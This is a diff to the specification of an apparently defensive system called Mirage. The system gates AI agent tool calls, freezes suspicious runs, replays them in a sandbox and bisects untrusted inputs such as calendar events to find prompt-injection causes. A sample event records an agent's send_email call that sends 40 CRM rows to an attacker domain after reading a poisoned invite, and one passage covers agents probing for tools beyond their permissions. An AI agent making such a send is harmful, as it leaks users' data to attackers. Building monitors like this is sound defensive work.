@@ -37,6 +37,8 @@ Change rules:
 ```
 queued → running → completed
             │
+            ├─(execution error)→ failed
+            │
             ├─(gate trips)→ frozen ─(human: unfreeze)→ running
             │                  │
             │                  └─(human: kill)→ killed ─(human: approve restart)→ new run (restarted_from = old id)
@@ -45,7 +47,10 @@ queued → running → completed
                                          relaunched by the engine; the task starts over
 ```
 
-`status`: `queued | running | frozen | completed | killed | halted`
+`status`: `queued | running | frozen | completed | failed | killed | halted`
+
+`failed` is terminal: the gateway denies further tool calls and SDK wait returns `failed`.
+Completion reports never change `frozen`, `killed`, `halted`, or any terminal run.
 
 Unfreeze is allowed only when the run has no incident or its incident is `open` or
 `false_positive`. While `detonating`, or once confirmed (any later status), the engine answers 409.
@@ -72,6 +77,7 @@ All times are ISO 8601 UTC. All IDs are strings.
   "env": "prod",
   "task": "Prepare tomorrow's meetings and email a summary to the user",
   "status": "frozen",
+  "status_reason": "Destination is not on the allowlist.",
   "started_at": "2026-10-10T14:02:11Z",
   "ended_at": null,
   "incident_id": "inc_007",
@@ -81,6 +87,9 @@ All times are ISO 8601 UTC. All IDs are strings.
 ```
 
 `env`: `prod | mirage`
+
+`status_reason` is optional and comes from the latest `run.status` event's `reason`.
+Execution failures expose only a sanitized category/type, never provider text, secrets or arguments.
 
 ### Event (one stream for everything)
 
@@ -190,9 +199,13 @@ So the UI and MCP always agree on the next step.
   "step": 3,
   "tool": "send_email",
   "args": { "to": "attacker@team26-attacker.com", "body": "<40 CRM rows>" },
-  "violates": ["P1", "P4", "P5"]
+  "violates": ["P1", "P4", "P5"],
+  "error": null
 }
 ```
+
+`error` is optional. A non-null error records a failed attempt, not a successful effect
+or evidence that the legitimate task completed. Error values contain only a sanitized category/type.
 
 ### Detonation
 
@@ -267,6 +280,8 @@ After an engine restart, a global STOP stays on (it comes back from the log) unt
 
 - `service`: `outbox | calendar | crm`
 - `flag`: `normal | malicious | blocked`. This lets the UI color the poisoned invite and the blocked email.
+- Failed tool results/effects do not populate the successful outbox. A successful outbound action with
+  `send_on` is labeled `scheduled for <date>`; it is not shown as already sent.
 
 ## 5. HTTP API
 
@@ -364,6 +379,8 @@ mirage detonate --incident inc_007 [--runs 3] [--remove-input in_cal_03] [--json
 
 - `contracts/fixtures/calendar_demo.jsonl` holds one `Event` per line, in order, with real timing (`ts`).
 - `contracts/fixtures/state/` holds `runs.json`, `incidents.json`, `services_*.json` at the end of the demo.
+- `execution_failure.jsonl` and `execution_snapshot.json` are synthetic contract examples for
+  failed completion/results/effects and story declarations; they are not the default demo recording.
 - With `MIRAGE_MODE=replay`, the real API server plays the `.jsonl` file over `/stream` and `/events`.
   Same endpoints, same OpenAPI. There is no separate mock server, so nothing can drift.
 - POST actions in replay mode move the replay forward (example: `/incidents/{id}/detonate` plays the detonation events).
@@ -566,13 +583,13 @@ Limits: Mirage sees only tool calls. Code that calls an API outside a tool, and 
 
 | Method | Path | Body → Returns (models in `contracts/models.py`) | Does |
 |---|---|---|---|
-| POST | `/agents` | `AgentSpec` `{name, owner, tools, allow: {tools, email_to, url_hosts}, entrypoint}` | Register an agent. `entrypoint` example: `agents.assistant:build_agent`. |
+| POST | `/agents` | `AgentSpec` `{name, owner, tools, allow: {tools, email_to, url_hosts}, entrypoint, legit?}` | Register an agent. `entrypoint` example: `agents.assistant:build_agent`. `legit` defaults to `{}`. |
 | POST | `/runs` | `RunStart` `{agent, task, env, restarted_from}` → `RunStarted` `{run_id, run_token}` | Start a run. Emits `run.started`. |
 | POST | `/runs/{id}/model-calls` | `ModelCall` `{model_id, request, response}` | Record one model call. |
 | POST | `/gateway/check` | `ToolCheck` `{run_id, tool, args}` → `GateDecision` | Check one tool call. The engine assigns `call_id`. |
 | POST | `/runs/{id}/tool-results` | `ToolResult` `{call_id, tool, result, error}` | Record one tool result (this is what the snapshot is made of). |
-| GET | `/runs/{id}/wait?timeout=25` | → `WaitResult` `{status: running \| frozen \| killed \| halted}` | Long poll while frozen. Returns as soon as the run leaves `frozen`, or `frozen` after `timeout` seconds (max 60): poll again. Set the HTTP client timeout above it. |
-| POST | `/runs/{id}/complete` | → `Run` | The agent finished its task. Emits `run.status` → `completed`. |
+| GET | `/runs/{id}/wait?timeout=25` | → `WaitResult` `{status: running \| frozen \| failed \| killed \| halted}` | Long poll while frozen. Returns as soon as the run leaves `frozen`, or `frozen` after `timeout` seconds (max 60): poll again. Set the HTTP client timeout above it. The SDK blocks on `failed`, `killed` or `halted`. |
+| POST | `/runs/{id}/complete` | Optional `RunCompletion` `{error: string \| null}` → `Run` | While `running`: absent/null error emits `run.status` → `completed`; non-null error emits `failed` with a sanitized reason. No body and `{}` preserve old clients. Contained and terminal runs stay unchanged. |
 
 Destination checks read the `to` and `url` arguments of **any** tool, so tool names are free.
 `allow.email_to` takes domains (`mirage-demo.com`), `*@domain`, or full addresses (`demo-user@mirage-demo.com`).
@@ -586,6 +603,17 @@ Human-action POSTs from web and MCP (§5) send `HumanRequest` `{actor, reason}`.
   task, entrypoint, model calls up to the freeze, every tool call with its result, and the inputs.
 - **Only the engine reads and writes it.** The SDK never parses it to answer tools; it gets a `call_tool`.
 - A tool result can hold several inputs (example: `read_calendar` returns 4 events). Each one is an `Input`.
+- `SnapshotToolResult` is `{call_id, tool, args, result, error?}`. Failed results stay recorded with
+  a sanitized `error` and `result: null`; they never contribute useful inputs or successful effects.
+  Replay preserves the failure outcome, not the provider's raw error text: the SDK reconstructs an
+  error tool message from the marker. Known built-in/common provider exception types are retained;
+  unknown or empty error strings become `ExecutionError`.
+- `AgentSpec.legit` is copied into each new/restarted run and its frozen `Snapshot.legit`.
+  It is an opaque declaration owned by the story; this contract only transports it. The current shape is
+  `{"required": [{"tool": "send_email", "args": {"to": "demo-user@mirage-demo.com"},
+  "nonempty": ["subject", "body"], "contains": {"body": ["Q4 sync"]}}]}`:
+  `args` names an exact subset to match, `nonempty` names required nonempty arguments, and `contains`
+  supplies relevant strings required in each named argument. Criterion evaluation belongs to the sandbox.
 - Detonation: the engine starts a jailed child process (no third-party keys, network only to Bedrock).
   The child calls `runner(snapshot, call_tool)` (`runner` defaults to `entrypoint`). For SDK agents the runner is
   `mirage.sandbox:run`: it rebuilds the agent from `entrypoint`, replays the recorded model replies up to
@@ -635,8 +663,9 @@ Built in `engine/detonation/`. The engine owns the process and the jail; the age
   contain one of its real tools, is probing for a way around its permissions. The `MIRAGE_ESCALATE_AFTER`-th such
   call in a run (default 2) answers `freeze` with `rule_id: ESCALATION` and opens an incident; earlier ones stay
   `UNKNOWN_TOOL`.
-- **Legit task**: the snapshot's `legit {tool, to}` when the agent declares one; otherwise at least one write with a
-  `to` argument delivered to an allowed destination with no rule broken (e.g. the brief reached the user).
+- **Legit task**: the snapshot carries the agent's opaque `legit` story declaration (above).
+  The sandbox owns evaluation; failed attempts cannot count as completion. Legacy `{tool, to}` declarations
+  and the existing empty-declaration fallback remain compatible until that evaluator is updated.
 - **Bisection** (`engine/bisect.py`): for each **untrusted** input (`calendar_event`, `email`, `web_page`,
   `attachment`; the user task and CRM records are trusted), detonate without it (default 2 runs, from scratch).
   The input whose removal drops the attack to 0 is the cause. `POST /incidents/{id}/bisect` needs a confirmed
